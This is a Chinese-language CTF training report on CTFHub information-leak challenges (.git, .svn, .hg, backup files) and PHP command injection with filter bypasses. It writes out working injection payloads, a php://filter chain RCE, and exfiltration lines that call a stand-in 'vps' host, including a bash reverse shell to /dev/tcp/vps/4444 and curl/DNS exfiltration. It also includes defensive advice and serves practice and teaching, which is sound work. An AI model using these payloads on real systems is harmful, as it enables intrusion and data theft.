# CTF 实战训练报告 · task9

> **训练内容**：环境安装 → 信息泄露漏洞 → PHP 命令执行与绕过
> **训练周期**：3 天（0.5 + 1 + 1）
> **实验环境**：WSL2 + Kali Linux Rolling + Windows Terminal
> **训练方式**：CTFHub 靶场通关 + 本地复刻（每个漏洞都在自己的虚拟机上复现）
> **成果**：**CTFHub 通关 17 题，取得 17 个 flag**

---

## 摘要

| 阶段 | 内容 | 时长 | 产出 |
|---|---|---|---|
| 第一章 | 环境安装 | 0.5 day | WSL2 + Kali + 基础 Linux 命令表 |
| 第二章 | 信息泄露漏洞 | 1 day | 9 个子题通关 + 五问解答 + 三类版本库统一框架 |
| 第三章 | PHP 命令执行与绕过 | 1 day | 8 个子题通关 + 8 个函数实测对比 + 6 类绕过 |

**核心结论（一句话）**

> **信息泄露是"该藏的东西被当成了公开的东西"；命令执行是"用户输入被拼进了要执行的字符串"。**
> **两者的共同点：漏洞不在代码逻辑里，而在"信任边界"上。**

---

# 第一章 环境安装（0.5 day）

## 1.1 为什么用虚拟机

**三个理由：**

| 理由 | 说明 |
|---|---|
| **目标通常是 Linux** | 多数靶场、Web 中间件、工具链都在 Linux 上 |
| **工具需要 Linux** | `sqlite3` / `hg` / `svn` / `rip-*` / `php_filter_chain_generator` 等 |
| **隔离** | 打靶过程可能触发反弹 shell、下载未知文件，不能污染宿主 |

**不推荐用云服务器**：反弹 shell、内网横向、扫描类操作容易被云厂商封禁或告警。

## 1.2 WSL2 + Kali Linux 安装

```powershell
# ① 启用 WSL2（管理员 PowerShell）
wsl --install

# ② 安装 Kali
wsl --install -d kali-linux

# ③ 验证
wsl -d kali-linux -- cat /etc/os-release
```

**本次实际环境：**

```
Kali GNU/Linux Rolling
PHP 8.4.24 (cli)          ← 本地实测用
Mercurial 7.2.3
Subversion 1.14.5
sqlite3 / python3 / curl / git 均自带
```

**网络说明**：Windows 侧 git 需要配置代理才能连 GitHub（本项目用 `http.proxy=http://127.0.0.1:7890`）；Kali 内访问 GitHub 偶尔受限，改用 `gh-proxy.com` 镜像下载工具。

## 1.3 基础 Linux 命令（本次实战高频用到）

### 1.3.1 目录与文件列举

| 命令 | 作用 | 本次使用场景 |
|---|---|---|
| `ls` | 列当前目录 | 命令注入后第一句 |
| `ls -la` | 列出含隐藏文件、权限、大小、时间 | 判断 `flag_xxx.php` 是不是目录 |
| `pwd` | 当前工作目录 | **一步定位 web 根** |
| `find / -name "*flag*"` | 按名字全盘找 | 找 flag 文件（**别加 `-maxdepth`，会漏**） |
| `find / -name index.php` | 按已知文件名反推目录 | 找 web 根 |
| `file` / `stat` | 判断文件类型 | |

### 1.3.2 文件读取

| 命令 | 特点 |
|---|---|
| `cat` | 最常用，但**常被过滤** |
| `tac` | **cat 反过来**，按行逆序输出 —— 绕过 `cat` 过滤的首选 |
| `head -1` / `tail` | 取前/后 N 行 |
| `sort` / `nl` / `rev` | 排序 / 加行号 / 反转 |
| `base64` | 编码输出 —— **避开 HTML 特殊字符的神器** |
| `grep -r "ctfhub" /var/www/html/` | **按内容找文件（最准）** |
| `xxd` / `od` | 十六进制查看 |
| `strings` | 从二进制里捞可打印字符串 |

### 1.3.3 内容特征查找

| 命令 | 作用 |
|---|---|
| `grep -r ctfhub /var/www/html/` | 一步出"路径 + 文件名 + 内容" |
| `grep -ro "ctfhub{[^}]*}" /` | 只输出匹配部分 |
| `strings .hg/store/00changelog.i` | 从二进制元数据里找明文 |
| `od -A d -t x1z file` | 十六进制 + ASCII 双栏，看文件头 |

### 1.3.4 数据处理

| 命令 | 作用 |
|---|---|
| `base64 -d` | **解码（GNU 版宽容，会自动跳过非 base64 字符）** |
| `openssl base64 -d` | 严格版，遇到垃圾字符直接失败 |
| `grep -oE '^[A-Za-z0-9+/=]+'` | 从混有 HTML 的响应里抠出 base64 |
| `sed 's/<.*//'` / `cut -d'<' -f1` | 砍掉 HTML 尾巴 |
| `awk '{print $4"\t"$2}'` | 取指定列（Git index 差集用） |
| `comm -23 <(...) <(...)` | 求差集（Git Index 题核心） |
| `tr -d '\000'` | 去掉 NUL 字节 |

### 1.3.5 版本库工具

| 工具 | 用途 |
|---|---|
| `git` | Git 泄露题的全部操作 |
| `sqlite3` | 读 SVN 的 `wc.db` |
| `hg`（mercurial） | 读 HG 的 revlog |
| `svn` | 复刻 SVN 仓库 |
| `rip-svn.pl` / `rip-hg.pl` | dvcs-ripper 的自动化脚本 |
| `php_filter_chain_generator.py` | 生成 `php://filter` 过滤器链 RCE payload |

---

# 第二章 信息泄露漏洞（1 day）

## 2.1 模块总览

**CTFHub「信息泄露」模块 9 题全部通关：**

| # | 题型 | flag | 关键技术 |
|---|---|---|---|
| 1 | 网站源码 | `ctfhub{95c6f03d7cda19058d88ec1f}` | 备份包字典 |
| 2 | bak 文件 | `ctfhub{ff20cd30144373eedaa01abc}` | 后缀爆破 |
| 3 | vim 缓存 | `ctfhub{1bbffdd2cca2f93ddc0ca8d8}` | `.swp` 结构 |
| 4 | .DS_Store | `ctfhub{2e801a81a591f99ffca80e07}` | macOS 元数据解析 |
| 5 | Git Log | `ctfhub{dc8b0894d5a5689a22a35ffe}` | reflog + `git show` |
| 6 | Git Stash | `ctfhub{03f0f3f844084d7134cedad3}` | `refs/stash` |
| 7 | Git 未删变体 | `ctfhub{b0571eeb61f6343ced553555}` | reflog 只有 2 行 |
| 8 | SVN | `ctfhub{6fd7676ba56da2a90a11af9a}` | `wc.db` + `PRISTINE.refcount` |
| 9 | HG | `ctfhub{9260b70ead69a60fb2e0d968}` | revlog + `_`→`__` 编码 |

**另有两道独立复现（非模块题，用于验证"不是抄 WP"）：**

| 复现对象 | flag | 说明 |
|---|---|---|
| Git Log 独立复现 | `ctfhub{009ee4ed36138139d7349d59}` | 换实例重新走一遍 |
| Git Stash 独立复现 | `ctfhub{053da77b26b117ed9a380b03}` | 同上 |
| HG 第二实例 | `ctfhub{52dd316df7c89131d95b8161}` | 验证文件名随机化 |

**第一轮（更早的记录，同模块）：**

```
ctfhub{1e5a12263055250cb6c8f170}   302 跳转
ctfhub{cf2690f992c9ebe484432aee}   Cookie 伪造
ctfhub{db7ba83bb0e787993a2fa43f}   基础认证 1
ctfhub{b227a7576366a4be3848faa5}   基础认证 2
ctfhub{d5b85603ca77329a3ae5a18}   Git 历史
```

## 2.2 五类信息泄露

### 2.2.1 Git 泄露

**成因**：在 web 目录执行 `git clone` / `git pull` 部署，`.git` 留在 web 根。

**`.git` 里有什么：**

| 内容 | 位置 | 危害 |
|---|---|---|
| 全部源码（每个版本） | `objects/` | 完整源码 |
| 全部提交历史 | `objects/` + `refs/` | 开发过程、注释里的密码 |
| 未提交改动 | `index` | 暂存区敏感文件 |
| 被"藏起来"的改动 | `refs/stash` | 连 commit 都没进 |
| 被"删掉"的东西 | `objects/` + `logs/` | `git rm` 删不掉对象 |

**四种变体与判据：**

| 变体 | 判据 | 提取命令 |
|---|---|---|
| **Log** | reflog 有 `remove flag` | `git show <add flag 的哈希>` |
| **Stash** | `refs/stash` 200 / reflog 有 `reset` | `git stash show -p` |
| **Index** | index 与 HEAD 的 blob 差集非空 | `git diff --cached` |
| **未删** | reflog 只有 `init → add flag` | `ls` + `cat` |

**四条命令兜底（下载后各打一遍）：**

```bash
ls && cat *.txt                       # 未删变体
git log --all -p | grep -i ctfhub     # Log
git stash show -p                     # Stash
git diff --cached                     # Index
```

**万能兜底（不判断题型，扫全部对象）：**

```bash
git cat-file --batch-all-objects --batch-check='%(objecttype) %(objectname)' \
  | awk '$1=="blob"{print $2}' \
  | while read -r h; do
      c=$(git cat-file -p "$h" 2>/dev/null | grep -oE '(ctfhub|flag)\{[^}]*\}' | head -1)
      [ -n "$c" ] && echo "★ $h → $c"
    done
```

### 2.2.2 备份文件下载

**六个载体：**

1. **网站源码包**：`www.zip` / `web.tar.gz` / `backup.zip` / `site.rar`
2. **后缀变体**：`.bak` `.old` `.orig` `.save` `.swp` `.copy` `.tmp` `.txt` `.1` `~`
3. **编辑器缓存**（vim 系列，见 2.3）
4. **系统元数据**：`.DS_Store` / `Thumbs.db` / `desktop.ini`
5. **配置密钥**：`.env` / `Dockerfile` / `docker-compose.yml` / `.gitlab-ci.yml`
6. **IDE 工程**：`.idea/` / `.vscode/` / `.settings/` / `*.iml`

**为什么 `.bak` 能读源码**：服务器按**最后扩展名**决定解析。

```
index.php.bak  →  .bak  →  静态文件  →  原样输出 ✅ 泄露
index.bak.php  →  .php  →  交给 PHP  →  不泄露
```

### 2.2.3 SVN 泄露

**成因**：在 web 目录 `svn checkout`，`.svn` 留在 web 根。
**正确做法**：`svn export`（不带 `.svn`）。

**两代结构：**

| 版本 | `.svn` 位置 | 元数据 | 内容 |
|---|---|---|---|
| ≤ 1.6 | 每个子目录 | `entries`（纯文本，有文件列表） | `text-base/<名>.svn-base` |
| ≥ 1.7 | 只有根目录 | `wc.db`（SQLite） | `pristine/<sha1前2位>/<sha1>.svn-base` |

**1.7+ 打法（实测）：**

```bash
curl -o wc.db "$T/.svn/wc.db"
sqlite3 wc.db "SELECT checksum, size, refcount FROM PRISTINE;"
#   $sha1$bf45c36a... | 221 | 1     ← 还在用
#   $sha1$0b4474e3... |  33 | 0     ← ★ 被删掉的旧版本
```

**`refcount = 0` = 没有任何工作副本文件引用它 = 被删掉的旧版本残留。**

**⚠️ 只看 `NODES` 会漏**：被删的文件 `presence='not-present'`、`checksum` 为空。

**四行版：**

```bash
T="http://challenge-xxx:10800"
curl -o wc.db "$T/.svn/wc.db"
for h in $(sqlite3 wc.db "SELECT checksum FROM PRISTINE;" | sed 's/\$sha1\$//'); do
  curl -s "$T/.svn/pristine/${h:0:2}/${h}.svn-base"
done | grep -a ctfhub
```

### 2.2.4 HG（Mercurial）泄露

**成因**：在 web 目录 `hg clone` / `hg pull`。

**三个关键文件：**

| 文件 | 作用 | 实测 |
|---|---|---|
| `.hg/last-message.txt` | 最后一次 commit message | `add flag` |
| `.hg/store/fncache` | 文件清单缓存 | 每行一个 store 路径 |
| `.hg/dirstate` | 当前文件列表（二进制） | `strings` 出 `flag_xxx.txt` |

**⚠️ 两个致命细节：**

**① 文件名要编码：`_` → `__`（下划线是转义符）**

```
fncache 里：data/flag_807728508.txt.i
实际路径：  data/flag__807728508.txt.i     ← 双下划线
直接按 fncache 取 → 404
改成双下划线     → 200
```

**② revlog 里的数据带标记字节**

```
75 63 74 66 68 75 62 7b
└┬┘ 'u' = 后面是原文（不是 zlib）
```

| 首字节 | 含义 |
|---|---|
| `'u'` (0x75) | 原文 |
| `'x'` (0x78) | zlib |
| `0x00` | 原文（无标记） |

**最简打法：**

```bash
# ① 拿文件名
curl -s "$T/.hg/dirstate" | strings | grep -E '\.txt$'
# ② 名字里 _ 换成 __，取内容
curl -s "$T/.hg/store/data/flag__807728508.txt.i" | grep -ao 'ctfhub{[^}]*}'
```

### 2.2.5 `.env` 直接暴露

**成因**：`.env` 放在 web 根，被 HTTP 直接读取。

**内容常含**：数据库密码、API Key、JWT Secret、Redis 密码。

**注意**：有些值是 **base64 编码**的，要 `base64 -d`。

## 2.3 作业五问（详见 `notes/20-信息泄露作业答案.md`）

### 问 1：Git 泄露是什么，为什么会有

**是什么**：`.git` 目录被部署到 web 根，HTTP 能直接读。

**为什么**：用 `clone`/`pull` 部署、在 web 目录直接开发、打包没加 `--exclude=.git`。

**为什么危害大**：`git rm` 删不掉对象 —— 要 `reflog expire` + `gc --prune` 才彻底。

### 问 2：备份文件有哪些；vim 缓存有哪些

**备份文件 6 类**（见 2.2.2）。

**vim 缓存 3 类 8 种：**

| 类型 | 文件名 | 触发 |
|---|---|---|
| swap | `.文件名.swp` → `.swo` → `.swn` → `.swm` → `.swl`... | 编辑中崩溃/被 kill |
| undo | `.文件名.un~` | `set undofile` |
| backup | `文件名~` | `set backup` |

**swap 的三种取法（实测对比）：**

| 方法 | 可靠性 |
|---|---|
| **`grep -ao "flag{[^}]*}" .index.php.swp`** | ⭐⭐⭐ **完整** |
| `strings` | ⭐⭐ 顺带能拿到服务器绝对路径 |
| `vim -r` | ⚠️ **可能只写了一半 → 恢复残缺** |

> **认知修正**：不是"必须 `vim -r`"。swap 按块异步写，崩溃时可能只写一半，`grep` 反而更完整。

### 问 3：SVN 泄露由什么引起

**在 web 目录 `svn checkout`，`.svn` 留在 web 根。**
**正确做法：`svn export`。**

### 问 4：不同种类怎么获取泄露的信息

**统一四步框架：探测 → 拿清单 → 取内容 → 解码。**

| 类型 | ① 探测 | ② 拿清单 | ③ 取内容 | ④ 解码 |
|---|---|---|---|---|
| 源码包 | 字典 | 解压 | 文件名当 URL | — |
| `.bak` | 加后缀 | — | `curl` | — |
| vim swp | `.文件名.swp` | — | `curl -O` | `grep -a` |
| `.DS_Store` | 固定路径 | 解析 filename | 文件名当 URL | `ds_store` 库 |
| **Git** | `.git/HEAD` | reflog / index / refs | `objects/<h[:2]>/<h[2:]>` | **zlib** |
| **SVN** | `.svn/wc.db` | `NODES` / `PRISTINE` | `pristine/<h[:2]>/<h>` | **原文** |
| **HG** | `.hg/requires` | `fncache` + `dirstate` | `store/data/<编码名>.i` | **zlib 或 `'u'`+原文** |
| `.env` | 固定路径 | — | `curl` | **base64 -d** |

**三个版本库的差异只有三条：**

| 差异 | Git | SVN | HG |
|---|---|---|---|
| 清单来源 | reflog + index + refs | `wc.db`（SQLite） | `fncache` + `dirstate` |
| **内容路径由什么决定** | **内容哈希** | **内容哈希** | **文件名编码** ★ |
| 内容编码 | zlib | 原文 | zlib 或 `'u'`+原文 |

> **记忆法：Git/SVN 按"内容指纹"找书（哈希），HG 按"书名"找书（文件名编码）。**

### 问 5：信息泄露出现的最大原因（自思考）

**一句话：不是"被攻破了什么"，而是"该藏的东西被当成了公开的东西"。**

**三层原因：**

**① 表层：开发环境和部署环境没有分离**

```
开发需要：.git / .svn / .env / .swp / node_modules
部署该有：只有源码文件
        ↓
用 clone / checkout / 拷整个目录 部署
        ↓
开发环境的东西【全部】被当成网站内容发布了
```

**② 认知：「看不见 = 不存在」的错觉**

```
.git  .svn  .env  .DS_Store  .index.php.swp
└─────────────┬─────────────┘
        都以 . 开头
              ↓
        ls 看不见 → 以为不存在
              ↓
        但 HTTP 请求不看你的 ls
```

**③ 动机：便利优先于安全**

| 便利做法 | 安全但麻烦 |
|---|---|
| `git clone` 部署 | `git archive` 打干净包 |
| `svn checkout` 部署 | `svn export` |
| `.env` 放 web 根 | 环境变量 / 配置中心 |
| 备份放同目录 | 备份到 web 根之外 |

**结论：信息泄露的根本原因不是技术问题，是流程问题。**
**防御靠的不是 WAF，是部署前那一条 `rm -rf .git .svn .env *.bak *.swp`。**

**五秒自查脚本：**

```bash
for p in .git/HEAD .svn/entries .svn/wc.db .hg/requires .env .DS_Store \
         www.zip index.php.bak .index.php.swp; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://your-site/$p")
  [ "$code" = "200" ] && echo "[!] 泄露: /$p"
done
```

## 2.4 复现证据

**每个漏洞都在本地 `~/infoleak-lab` 或 Kali 的 `/tmp` 下用 `php -S` 复刻过：**

| 类型 | 本地复刻方式 |
|---|---|
| Git 四种变体 | `git init` + 手工制造 reflog / stash / index 差异 |
| SVN | `svnadmin create` + `svn checkout` + 删文件 |
| HG | `hg init` + `hg commit` + `hg rm` |
| 备份文件 / vim | 直接造 `.bak` / `.swp` |
| `.DS_Store` | Python 生成 |

**典型复刻脚本位置**：`D:\VMs\logs\*.sh`（`gitlog-run.sh`、`svn-pwn.sh`、`hg-dig.sh`、`lfi-trace2.sh` 等）。

---

# 第三章 PHP 命令执行与绕过（1 day）

## 3.1 命令执行的根因

```php
// 危险写法
system("ping -c 4 " . $_GET['ip']);
```

```
用户输入: 127.0.0.1; cat /flag
拼出来的: ping -c 4 127.0.0.1; cat /flag
                          ↑ 分号 = 命令分隔符 → 第二条被执行
```

**两个层面：**

| 层面 | 执行什么 | 函数 |
|---|---|---|
| **系统命令执行** | 交给 shell | `system` / `exec` / `shell_exec` / `passthru` / `popen` / `proc_open` / 反引号 |
| **代码执行** | 交给 PHP 解释器 | `eval` / `assert` / `create_function` / `preg_replace(/e)` / `call_user_func` / `array_map` |

## 3.2 八个系统命令执行函数（PHP 8.4 实测）

**测试命令**：`echo line1; echo line2; id -un`

| 函数 | 直接回显 | 返回值 | 多行 | 退出码 |
|---|---|---|---|---|
| **`system()`** | **✅ 有** | `string`（最后一行） | ✅ | ✅ 第 2 参数 |
| **`exec()`** | ❌ 无 | `string`（最后一行） | 需第 2 参数 | ✅ 第 3 参数 |
| **`shell_exec()`** | ❌ 无 | `string`（**全部输出**） | ✅ | ❌ |
| **`` `反引号` ``** | ❌ 无 | `string`（全部） | ✅ | ❌ |
| **`passthru()`** | **✅ 有**（原始二进制） | `null` | ✅ | ✅ 第 2 参数 |
| **`popen()`** | ❌ 无 | `resource`（文件指针） | ✅ `fread` | ✅ `pclose` |
| **`proc_open()`** | ❌ 无 | `resource`（进程句柄） | ✅ 管道 | ✅ `proc_close` |
| **`pcntl_exec()`** | **✅ 有** | 无（替换进程） | ✅ | ❌ |

**实测输出对照：**

```
system             回显: line1\nline2\nkali\n    返回: 'kali'           退出码=0
exec               回显: （空）                    返回: 'kali'           退出码=0  数组=["line1","line2","kali"]
shell_exec         回显: （空）                    返回: 'line1\nline2\nkali\n'
passthru           回显: line1\nline2\nkali\n    返回: NULL             退出码=0
反引号 `cmd`       回显: （空）                    返回: 'line1\nline2\nkali\n'
popen+pclose       回显: （空）                    返回: 'line1\nline2\nkali\n' 退出码=0
proc_open          回显: （空）                    返回: 'line1\nline2\nkali\n' 退出码=0
```

### 三分类总结

```
【直接回显】结果直接进响应体，不需要变量接
    system / passthru / pcntl_exec

【返回结果】结果装进变量，要 echo 才显示
    exec（末行）/ shell_exec（全部）/ 反引号（全部）

【返回句柄】给你个指针，自己读
    popen / proc_open
```

### 选型速查

| 需求 | 用哪个 |
|---|---|
| 要立刻看到结果 | **`system`** |
| 结果要处理/过滤 | `shell_exec`（全部字符串） |
| 要多行数组 | `exec` + 第 2 参数 |
| 要退出码 | `system` / `exec` / `passthru` |
| 要 stderr | `proc_open` |
| 双向交互 | `popen("w")` / `proc_open` |
| **无回显时** | `exec` / `shell_exec` 拿返回值再外带 |

## 3.3 代码执行类函数

| 函数 | 说明 | 版本限制 |
|---|---|---|
| **`eval()`** | 执行任意 PHP 代码（语言结构） | 全版本 |
| `assert()` | 老版本可执行字符串 | **PHP 7.2+ 不再执行字符串** |
| `create_function()` | 动态造函数 | PHP 7.2 废弃，8 移除 |
| `preg_replace(/e)` | 执行替换结果 | **PHP 7 移除** |
| `call_user_func()` / `call_user_func_array()` | 回调 | 全版本 |
| `array_map` / `array_filter` / `array_reduce` | 回调 | 全版本 |
| `usort` / `uasort` | 排序回调 | 全版本 |
| `ob_start()` | 输出缓冲回调 | 全版本 |
| `include` / `require` | 文件包含（配合伪协议） | 全版本 |

**PHP 8 实测：**

```php
eval("system('id');");                    // ✅ 有输出
assert("system('id');");                  // ❌ 8.x 不执行字符串
create_function('', 'system("id");');     // ❌ 8.x 已移除
preg_replace('/.*/e', 'system("id")', ''); // ❌ 7.x 已移除
call_user_func('system', 'id');           // ✅
array_map('system', ['id']);              // ✅
```

## 3.4 其它可注入命令的地方

| 位置 | 说明 |
|---|---|
| `mail($to,$sub,$msg,$hdr,$param)` | 第 5 参数传给 `sendmail` |
| `putenv("LD_PRELOAD=...")` | 设置环境变量，劫持动态库 |
| `imap_open($mailbox,...)` | mailbox 参数可注入 |
| `error_log($msg, 1, $to)` | `$to` 传给 `sendmail` |
| `mb_send_mail` | 同 `mail` |
| `pcntl_exec` | 常被忘在 `disable_functions` 之外 |
| `dl()` | 加载 PHP 扩展 |
| `ImageMagick` 的 `convert` | 文件名注入 |

## 3.5 CTFHub RCE 模块通关（8 题）

| # | 题型 | 过滤 | 绕过 | flag |
|---|---|---|---|---|
| 1 | **命令注入-无过滤** | 无 | `\|cat` | `ctfhub{64e8e0dae77db7d9c15ef8ab}` |
| 2 | **eval 代码执行** | 无 | `?cmd=system("ls /");` | `ctfhub{7234bb617c6421e4b8e40365}` |
| 3 | **过滤 cat** | `cat` | `tac` / `c\at` / `/bin/c?t` | `ctfhub{5c3d2c0615beb813269640b6}` |
| 4 | **过滤空格** | 空格 | `${IFS}` | `ctfhub{7d4f698eda802c44829c9db7}` |
| 5 | **过滤目录分隔符** | `/` | `${PATH:0:1}` | `ctfhub{fba85d19b6751d803b3cee7c}` |
| 6 | **过滤运算符** | `\|` `&` | `;` / 换行 | `ctfhub{613d57ca6515a6b766b7caa0}` |
| 7 | **综合练习** | 8 项全过滤 | 见下 | `ctfhub{7d928b22123076276bb32251}` |

### 综合题的源码（最难的）

```php
preg_match_all("/(\||&|;| |\/|cat|flag|ctfhub)/", $ip, $m)
```

**8 个过滤项：**

| # | 模式 | 匹配 |
|---|---|---|
| 1 | `\|` | 竖线（`\|` 是正则元字符，要转义） |
| 2 | `&` | 与号 |
| 3 | `;` | 分号 |
| 4 | ` ` | 空格 |
| 5 | `\/` | 斜杠（`/` 是定界符，要转义） |
| 6 | `cat` | 字符串 |
| 7 | **`flag`** | 字符串 |
| 8 | `ctfhub` | 字符串 |

**最终 payload：**

```
%0a${PATH:0:1}bin${PATH:0:1}c?t${IFS}f?ag_is_here${PATH:0:1}*
```

**逐段拆解：**

| 片段 | 作用 |
|---|---|
| `%0a` | 换行（代替被过滤的 `;` `\|` `&`） |
| `${PATH:0:1}` | `/` |
| `bin` | `/bin` |
| `c?t` | `cat`（`?` 通配） |
| `${IFS}` | 空格 |
| `f?ag_is_here` | `flag_is_here`（`?` 通配） |
| `*` | 目录里的文件 |

**展开后：**

```bash
/bin/cat /var/www/html/flag_is_here/flag_273182659722304.php
```

### 文件包含类（4 题，同属 RCE 模块）

| 题 | 过滤 | 打法 | flag |
|---|---|---|---|
| 文件包含 1 | `strpos($file,"flag")` | 借 `shell.txt` 里的 `eval($_REQUEST['ctfhub'])` | `ctfhub{b4e8289cf23e6289829fb568}` |
| 文件包含 2（必须 `php://`） | `substr($file,0,6)==="php://"` | `php://input` + POST 代码 | `ctfhub{29c7fc65ea7034f067119535}` |
| 文件包含 3（必须 `php://`，flag 路径已知） | 同上 | `php://filter/resource=/flag` | `ctfhub{95366c4682c791d1ff3f4272}` |
| 文件包含 4（无 shell.txt） | `strpos($file,"flag")` | `php://input` | `ctfhub{3e8215ea4ad95ff54cb15fe2}` |

## 3.6 绕过方式总结（6 类）

### 3.6.1 空格绕过

**目标**：让 `cat /flag` 里的空格不被过滤。

| 手法 | payload | 实测 |
|---|---|---|
| **`${IFS}`** | `cat${IFS}/flag` | ✅ **最稳** |
| `$IFS$9` | `cat$IFS$9/flag` | ✅ |
| `$IFS` | `cat$IFS/flag` | ✅ |
| 花括号 | `{cat,/flag}` | ✅ |
| 重定向 `<` | `cat</flag` | ✅ |
| 制表符 `%09` | `cat%09/flag` | ✅ |
| `$'\t'` | `cat$'\t'/flag` | ✅ |
| `$'\x20'` | `cat$'\x20'/flag` | ✅ |

**⚠️ 反直觉的实测结果：**

```
空格   (0x20) → ✅ 当空格用
制表   (0x09) → ✅ 当空格用
换行   (0x0a) → ❌ 不是空格 —— 它是【命令分隔符】
回车   (0x0d) → ❌
垂直制表 (0x0b) → ❌
```

**`${IFS}` 是什么**：`IFS` = Internal Field Separator，shell 的分词符，默认值 = 空格 + 制表 + 换行。

**为什么必须加 `{}`**：

```bash
echo$IFShello    → 变量名被解析成 "IFShello" → 空 ❌
echo${IFS}hello  → 明确变量名是 IFS → hello ✅
```

### 3.6.2 关键字绕过

| 手法 | payload | 实测 |
|---|---|---|
| **反斜杠** | `ec\ho` | ✅ |
| 单/双引号 | `ec''ho` / `ec""ho` | ✅ |
| 变量拼接 | `a=ec;b=ho;$a$b` | ✅ |
| 通配 `?` | `/bin/ec?o` | ✅ |
| 通配 `*` | `/bin/e*` | ⚠️ 会匹配到多个（`/bin/editor` 等）→ 失败 |
| 命令替换 | `$(echo ec)ho` | ✅ |
| 反引号 | `` `echo ec`ho `` | ✅ |

**⚠️ `*` 的坑（实测）：**

```
/bin/e*  →  /bin/editor /bin/egrep /bin/elfedit ... hello
            ↑ 匹配到一堆，第一个直接当命令跑 → 失败
```

**所以 `?` 比 `*` 安全**：`/bin/ec?o` 只有一个匹配。

**⚠️ 通配符必须有"目录上下文"：**

```
c?t          → 在【当前目录】找 → 没有匹配 → 命令不存在 ❌
/bin/c?t     → 在【/bin】找 → 匹配 /bin/cat ✅
```

**常用替换表：**

| 原字符 | 替代 |
|---|---|
| `cat` | `tac` / `c\at` / `c'a't` / `/bin/c?t` / `$a$b` |
| `flag` | `f?ag` / `f*` / `????_??_????` / `[f]lag` |
| 空格 | `${IFS}` / `$IFS$9` / `<` / `%09` |
| 斜杠 | `${PATH:0:1}` / `$'\57'` |

### 3.6.3 命令分隔符

| 符号 | 行为 | 前者输出去哪 |
|---|---|---|
| `;` | 顺序执行 | 直接输出（被 exec 收集） |
| **`\|`** | **管道** | **喂给后者 stdin → 被丢弃** ✅ |
| `\|\|` | 前者失败才执行 | 直接输出 |
| `&&` | 前者成功才执行 | 直接输出 |
| `&` | 后台 | 直接输出 |
| **`%0a`（换行）** | 同 `;` | 直接输出 |

**为什么本题用 `|` 更好（实测耗时对比）：**

| payload | 拼成的命令 | 耗时 | 输出行数 |
|---|---|---|---|
| `127.0.0.1;id` | `ping -c 4 127.0.0.1;id` | **3425 ms** | 9 行（混） |
| **`\|id`** | `ping -c 4 \|id` | **347 ms** | **1 行** |

**原因：`|` 让 `ping -c 4` 立刻失败（不用等 4 秒），且它的 stdout 被管道吃掉。**

### 3.6.4 编码绕过

```php
// ① base64
system(base64_decode("aWQ="));           // id
// ② hex
echo shell_exec(hex2bin("6964"));        // id
// ③ 反转
system(strrev("galf/ tac"));             // cat /flag
```

```bash
# shell 层
$'\x63\x61\x74' /flag                     # cat /flag
echo 'Y2F0IC9mbGFn' | base64 -d | bash    # cat /flag
```

### 3.6.5 无回显外带（5 种）

| 方法 | 命令 | 前提 |
|---|---|---|
| **写文件** | `id > /var/www/html/o.txt` | 知道 web 根 + 可写 |
| **HTTP 外带** | `curl http://vps/?x=$(id\|base64 -w0)` | 能出网 |
| **DNS 外带** | `ping -c1 $(whoami).dns.com` | 只放行 DNS 也行 |
| **时间盲注** | `if [ $(cut -c1 /flag) = "f" ]; then sleep 3; fi` | 只能观察耗时 |
| **反弹 shell** | `bash -i >& /dev/tcp/vps/4444 0>&1` | 能出网 |

### 3.6.6 禁用函数绕过（10 种）

| 手法 | 原理 | 前提 |
|---|---|---|
| **`LD_PRELOAD` + `putenv` + `mail`** | `mail()` 第 5 参数触发 `sendmail`，加载恶意 `.so` | 能上传 `.so` |
| Apache Mod CGI | 上传 `.htaccess` 启用 CGI | Apache |
| PHP-FPM / FastCGI | 打 FPM 端口 | 能访问 |
| Shellshock | `BASH_ENV` 注入 | bash < 4.3 |
| `imap_open` | mailbox 参数注入 | `imap` 扩展 |
| **`pcntl_exec`** | **常被忘在 `disable_functions` 之外** | `pcntl` 扩展 |
| Windows COM | `new COM("WScript.Shell")` | Windows |
| `putenv` + `error_log` | 同 LD_PRELOAD 思路 | |
| `bash` 的 `enable -f` | 加载自定义内建命令 | |
| `win32std` | `win_exec` | Windows |

### 3.6.7 文件包含专项：`php://filter` 过滤器链 RCE

**场景**：`allow_url_include=Off`，无法用 `php://input`，且不能列目录。

**原理**：`convert.iconv.*` 系列编码转换可以"构造"出任意字节。

```bash
python3 ~/tools/php_filter_chain_generator.py --chain '<?php system("ls /"); ?>'
# 输出一条 4600+ 字符的 php://filter/... URL

curl -g "$T/?file=$(...)" 
# → 执行 system("ls /")，实测成功列出目录
```

**实测结果：**

```
bin boot dev etc flag_3213 home lib ...
```

**这是"只有 filter 时"的终极解法。**

## 3.7 防御

| 层面 | 做法 |
|---|---|
| **不拼字符串** | `escapeshellarg()` / `escapeshellcmd()` |
| **白名单** | `filter_var($ip, FILTER_VALIDATE_IP)` |
| **不用 shell** | `proc_open` 传数组（PHP 7.4+ 支持 `["cmd","arg1"]`） |
| **禁用函数** | `disable_functions = system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec` |
| **最小权限** | web 用户不能读 `/flag`、不能出网 |
| **open_basedir** | 限制可访问目录 |

```php
// 危险
system("ping -c 1 " . $_GET['ip']);

// 稍好
system("ping -c 1 " . escapeshellarg($_GET['ip']));

// 最好
if (!filter_var($_GET['ip'], FILTER_VALIDATE_IP)) { die('invalid'); }
system("ping -c 1 " . $_GET['ip']);
```

**⚠️ `escapeshellarg` 也不是万能的** —— Windows 上有已知绕过（`%` 和 `!`）。

---

# 第四章 总结

## 4.1 知识地图

```
任务
├── 环境
│   └── WSL2 + Kali（工具链：curl / sqlite3 / hg / svn / python3）
│
├── 信息泄露（5 类）
│   ├── 版本库类（同一原理，三条差异）
│   │   ├── Git  → .git/        → 哈希路径 → zlib
│   │   ├── SVN  → .svn/wc.db   → 哈希路径 → 原文
│   │   └── HG   → .hg/         → 文件名编码 → zlib/'u'
│   ├── 备份文件类
│   │   └── 源码包 / 后缀变体 / .DS_Store / .env / IDE
│   └── 编辑器缓存类
│       └── vim: .swp / .swo / .un~ / ~
│
└── 命令执行（3 层）
    ├── 系统命令函数（8 个：回显 / 返回 / 句柄）
    ├── 代码执行函数（eval / 回调 / 文件包含）
    └── 绕过（6 类）
        ├── 空格 → ${IFS}
        ├── 关键字 → tac / c\at / f?ag
        ├── 斜杠 → ${PATH:0:1}
        ├── 分隔符 → ; / %0a / |
        ├── 编码 → base64 / hex
        └── 禁用函数 → LD_PRELOAD / 伪协议链
```

## 4.2 踩坑清单（23 条）

| # | 坑 | 教训 |
